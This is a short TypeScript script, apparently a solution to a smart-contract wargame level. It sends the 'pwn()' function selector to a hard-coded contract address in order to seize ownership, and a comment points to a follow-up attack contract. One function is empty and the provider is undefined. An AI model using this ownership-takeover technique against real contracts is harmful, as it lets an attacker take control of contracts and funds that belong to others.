import { ethers } from 'ethers'
import Web3 from 'web3'

export const hack = async (newOwner: string, targetAddress: string): Promise<void> => {
}

// js hack
export const hackW3 = async (newOwner: string, targetAddress: string): Promise<void> => {
    const web3 = new Web3(web3Provider)
    const selector = web3.eth.abi.encodeFunctionSignature("pwn()")
    await web3.eth.sendTransaction({from: newOwner, to: targetAddress, data: selector})
}

// Follow up with smart contract hack
// bytes4 encodedSignature = bytes4(keccak256("pwn()")); in attack contract






(async () => {
    try {
        const result = await hackW3("0x89173db24f3b114b5390b81100f5B38139380467", "0x2E7A635542e16205D5619ef0F765d825E93469B1")
    } catch (e) {
        console.log(e.message)
    }
})()